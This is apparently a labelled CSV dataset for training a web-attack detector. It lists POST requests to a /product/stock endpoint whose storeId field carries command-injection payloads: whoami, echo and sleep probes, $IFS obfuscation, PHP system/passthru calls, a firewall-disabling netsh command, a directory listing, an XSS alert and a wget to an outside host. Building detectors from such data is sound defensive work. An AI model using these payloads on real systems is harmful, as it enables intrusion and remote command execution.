method,path,body,dashes,andsign,dolar,orsign,lessthan,greaterthan,exclamation,badwords,class
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 {${sleep(10)}},0,0,1,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo CLYXGN$((72+81))$(echo CLYXGN)CLYXGN,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo NCRQQT$((66+95))$(echo NCRQQT)NCRQQT""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSXIMJKY$((88+60))$(echo$IFSXIMJKY)XIMJKY//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo NMVRBB$((60+26))$(echo NMVRBB)NMVRBB//",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo EEPGGY$((39+86))$(echo EEPGGY)EEPGGY',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo$IFSJOEJNW$((26+59))$(echo$IFSJOEJNW)JOEJNW',0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;echo OOBLUU$((57+95))$(echo OOBLUU)OOBLUU,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo FXCZOR)
 str1=${#str}
 if [ 2 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %26",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 & sleep 0 && str=$(echo FWEHDM) && str1=${#str} && [ 5 -eq ${str1} ] && sleep 1 ',0,4,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo PUPQPK); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo SIYJRM$((59+4))$(echo SIYJRM)SIYJRM|,0,1,2,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""echo$IFSTDYQVX$((81+75))$(echo$IFSTDYQVX)TDYQVX//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ' echo DOOTQL$((40+84))$(echo DOOTQL)DOOTQL&,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ROEZHE)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %7C",0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo FKMVVE$((10+58))$(echo FKMVVE)FKMVVE,0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 9 -ne $(echo BLTNIK | tr -d '\n' | wc -c) ] || sleep 1 %22",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 3 -ne $(echo WXFPFO | tr -d '\n' | wc -c) ] || sleep 1 %27,0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo BXLXVP)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi """,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo OKKNHF); str1=${#str}; if [ 1 -ne ${str1} ]; then sleep 0; else sleep 1; fi |,0,0,3,1,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo BQAOON$((14+21))$(echo BQAOON)BQAOON',0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo$IFSBCFSQL$((44+41))$(echo$IFSBCFSQL)BCFSQL&,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
echo PETUUK$((81+85))$(echo PETUUK)PETUUK""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | netsh firewall set opmode disable,0,0,0,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo$IFSITCFYR$((58+9))$(echo$IFSITCFYR)ITCFYR&",0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSSXZPOT$((38+66))$(echo$IFSSXZPOT)SXZPOT,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${@print(system($_SERVER['HTTP_USER_AGENT']))},0,0,2,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 |echo$IFSBKTNUH$((60+31))$(echo$IFSBKTNUH)BKTNUH""",0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 5 -ne $(echo YPWXZB | tr -d '\n' | wc -c) ] || sleep 1 \\",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo CRIQOG$((34+52))$(echo CRIQOG)CRIQOG\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSBWMKQC$((8+22))$(echo$IFSBWMKQC)BWMKQC//,0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ZGYOBQ); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo$IFSXSEOTZ$((78+18))$(echo$IFSXSEOTZ)XSEOTZ//",0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSSXSTPH$((13+95))$(echo$IFSSXSTPH)SXSTPH',0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ;id|,0,0,0,1,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 |echo ACPWWS$((49+8))$(echo ACPWWS)ACPWWS|,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 $(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),0,0,1,0,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '| [ 9 -ne $(echo JEORXY | tr -d '\n' | wc -c) ] || sleep 1 %7C,0,0,1,6,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 a;/usr/bin/id|,0,0,0,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 4 -ne $(echo ZDEVVW | tr -d '\n' | wc -c) ] || sleep 1 ',0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo QZXLOK$((2+27))$(echo QZXLOK)QZXLOK',0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ;echo$IFSVQMZED$((6+60))$(echo$IFSVQMZED)VQMZED|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSKKDTAV$((24+52))$(echo$IFSKKDTAV)KKDTAV|,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSKELZXS$((60+60))$(echo$IFSKELZXS)KELZXS""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "" echo QUEVJY$((66+5))$(echo QUEVJY)QUEVJY//",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo IWMDND$((49+2))$(echo IWMDND)IWMDND""",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 echo '<script>alert(1)</script>'// XXXXXXXXXXX,0,0,0,0,2,2,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ||echo GGJYSE$((67+63))$(echo GGJYSE)GGJYSE//,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSFQIXOT$((96+55))$(echo$IFSFQIXOT)FQIXOT&,0,0,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSVYMVPZ$((67+64))$(echo$IFSVYMVPZ)VYMVPZ",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""& sleep 0 && str=$(echo RIIZGU) && str1=${#str} && [ 9 -eq ${str1} ] && sleep 1 '",0,4,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 'echo$IFSFOVBLV$((51+93))$(echo$IFSFOVBLV)FOVBLV""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ${passthru(print(`echo OAAISJ`.`echo $((72+52))`.`echo OAAISJ`.`echo OAAISJ`);#OAAISJ,0,0,2,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo GRQVVJ$((32+82))$(echo GRQVVJ)GRQVVJ'",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 'echo$IFSEOXXHA$((67+86))$(echo$IFSEOXXHA)EOXXHA',0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSSUHYSU$((21+53))$(echo$IFSSUHYSU)SUHYSU\,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo ZNVIVL$((97+19))$(echo ZNVIVL)ZNVIVL//",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSLXLIDX$((76+8))$(echo$IFSLXLIDX)LXLIDX\\,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSNSUHXN$((87+12))$(echo$IFSNSUHXN)NSUHXN',0,1,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSUEFESK$((60+44))$(echo$IFSUEFESK)UEFESK|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo CFOPSJ$((27+97))$(echo CFOPSJ)CFOPSJ',0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1  echo WGOISG$((75+94))$(echo WGOISG)WGOISG\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 print(`echo ETZHWZ\necho $((20+88))\necho ETZHWZ\necho ETZHWZ`);//ETZHWZ,0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo GSKKXZ)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi #",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSRRGUBD$((41+37))$(echo$IFSRRGUBD)RRGUBD|,0,1,4,1,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
echo PPSKOS$((66+51))$(echo PPSKOS)PPSKOS'",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "".print(`echo CEZYFB\necho $((70+98))\necho CEZYFB\necho CEZYFB`);.%252522CEZYFB",0,0,1,0,0,0,0,8,bad
POST,/product/stock,"productId=2&storeId=1 ;echo VFFQVI$((85+47))$(echo VFFQVI)VFFQVI""",0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ||echo$IFSUEGFHX$((37+52))$(echo$IFSUEGFHX)UEGFHX""",0,0,4,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo QZBRFT); str1=${#str}; if [ 8 -ne ${str1} ]; then sleep 0; else sleep 1; fi %5C%5C,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 '|echo RHSIRJ$((85+6))$(echo RHSIRJ)RHSIRJ\\,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo GOUIRV)
 str1=${#str}
 if [ 7 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ${system(print(`echo GVUXPA;echo $((23+14));echo GVUXPA;echo GVUXPA`);%5C%5CGVUXPA,0,0,2,0,0,0,0,6,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo NKMKNI$((64+82))$(echo NKMKNI)NKMKNI\\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 6 -ne $(echo YPWXZB | tr -d '\n' | wc -c) ] || sleep 1 \\",0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSIBAZCJ$((13+42))$(echo$IFSIBAZCJ)IBAZCJ//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '&echo BRROSL$((24+11))$(echo BRROSL)BRROSL\,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo$IFSMIRTWY$((62+53))$(echo$IFSMIRTWY)MIRTWY,0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo RPOOHR
echo $((72+27))
echo RPOOHR
echo RPOOHR`);%2523RPOOHR",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo GIPRGX)
 str1=${#str}
 if [ 9 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi &",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo HLPASS$((48+61))$(echo HLPASS)HLPASS,0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""&&echo FXNWMX$((79+34))$(echo FXNWMX)FXNWMX'",0,1,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSTZERWA$((97+63))$(echo$IFSTZERWA)TZERWA,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSGKBHIR$((84+74))$(echo$IFSGKBHIR)GKBHIR',0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1  echo IOJYKG$((10+79))$(echo IOJYKG)IOJYKG|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | [ 5 -ne $(echo DAJIYU | tr -d '\n' | wc -c) ] || sleep 1 |,0,0,1,6,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
 str=$(echo JADKKF)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi %22",0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 ; str=$(echo DRVINS); str1=${#str}; if [ 2 -ne ${str1} ]; then sleep 0; else sleep 1; fi %26,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 &&echo$IFSMEDCEY$((8+25))$(echo$IFSMEDCEY)MEDCEY\\,0,1,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo$IFSQSKWMC$((77+87))$(echo$IFSQSKWMC)QSKWMC""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 "";echo$IFSEKSIGH$((71+77))$(echo$IFSEKSIGH)EKSIGH//",0,0,4,0,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 '
echo$IFSCNBVMZ$((1+71))$(echo$IFSCNBVMZ)CNBVMZ""",0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ZGYOBQ); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi %2F%2F,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 "")print(`echo COYGWQ;echo $((40+21));echo COYGWQ;echo COYGWQ`);%29%7DCOYGWQ",0,0,1,0,0,0,0,5,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""|echo JFFFCK$((98+39))$(echo JFFFCK)JFFFCK",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 ""| [ 8 -ne $(echo SYHTME | tr -d '\n' | wc -c) ] || sleep 1 //",0,0,1,5,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 ""||echo TELPMA$((31+37))$(echo TELPMA)TELPMA",0,0,2,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 
echo FHNIBR$((51+94))$(echo FHNIBR)FHNIBR",0,0,2,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 &echo RCNYOU$((2+11))$(echo RCNYOU)RCNYOU|,0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ';echo$IFSCFBNIF$((41+28))$(echo$IFSCFBNIF)CFBNIF//,0,0,4,0,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo ERVJHE); str1=${#str}; if [ 4 -ne ${str1} ]; then sleep 0; else sleep 1; fi \\,0,0,3,0,0,0,0,3,bad
POST,/product/stock,"productId=2&storeId=1 ||echo DQMLLV$((10+50))$(echo DQMLLV)DQMLLV""",0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 ||echo QQNXUE$((73+58))$(echo QQNXUE)QQNXUE,0,0,2,2,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 |echo$IFSXBQKGF$((50+52))$(echo$IFSXBQKGF)XBQKGF|,0,0,4,2,0,0,0,2,bad
POST,/product/stock,"productId=2&storeId=1 "");}print(`echo LVFGXD`.`echo $((25+23))`.`echo LVFGXD`.`echo LVFGXD`);.""LVFGXD",0,0,1,0,0,0,0,5,bad
POST,/product/stock,"productId=2&storeId=1 "" echo GFNYXZ$((0+51))$(echo GFNYXZ)GFNYXZ|",0,0,2,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '|echo$IFSWWFYLU$((17+21))$(echo$IFSWWFYLU)WWFYLU//,0,0,4,1,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 | [ 9 -ne $(echo SQHKCG | tr -d '\n' | wc -c) ] || sleep 1 &,0,0,1,5,0,0,0,2,bad
POST,/product/stock,productId=2&storeId=1 & ls -laR /var/www,0,0,0,0,0,0,0,0,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,productId=2&storeId=1 '; str=$(echo DHYUHH); str1=${#str}; if [ 6 -ne ${str1} ]; then sleep 0; else sleep 1; fi #,0,0,3,0,0,0,0,3,bad
POST,/product/stock,productId=2&storeId=1 | whoami,0,0,0,1,0,0,0,1,bad
POST,/product/stock,"productId=2&storeId=1 '
 str=$(echo ZSGSGJ)
 str1=${#str}
 if [ 4 -ne ${str1} ]
 then sleep 0
 else sleep 1
 fi //",0,0,3,0,0,0,0,3,bad
